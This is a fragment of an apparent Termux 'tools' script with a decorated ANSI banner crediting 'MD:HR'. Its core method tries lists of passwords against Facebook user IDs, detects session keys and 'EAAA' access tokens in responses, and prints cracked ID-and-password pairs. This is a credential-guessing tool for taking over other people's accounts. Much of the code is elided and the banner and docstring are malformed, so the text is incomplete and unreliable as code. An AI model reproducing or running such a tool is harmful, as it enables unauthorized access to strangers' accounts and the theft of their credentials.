...
\033[1;32m║════════════════════════║
\033[1;32m║AUTHOR    : MD :Har  ║║ \x1b[1;91m
\033[1;32m║═════════════════════ ═══🍁
\033[1;32m║WHATSAPP  : +880**********             ║
\033[1;32m║════════════════════════🍁
\033[1;32m║GITHUB    : 9Team10-HR                          ║
\033[1;32m║════════════════════════ 🥰
\033[1;32m║SERVER    : DATA - WIFI WORKING         .║
\033[1;32m║════════════════════════ 🍁
\033[1;32m║FACEBOOK : MD:HR                           .       ║
\033[1;32m║════════════════════════ 🍁
\033[1;32m║FB PAGE :  Tearmux tools                          ║
\033[1;32m╚════════════════════════😜
def ud():
 \033[1;32m[\033[0;41;37m==========={ AUTHER MD:HR 🔥\033[0;37;41m SAMI }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
   """
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[🍁MD:HR😜] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[OK:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \'\033[1;32m'    [MD:HR😜-OK🌻] %s | %s\033[0;97m         "%(uid, pw))
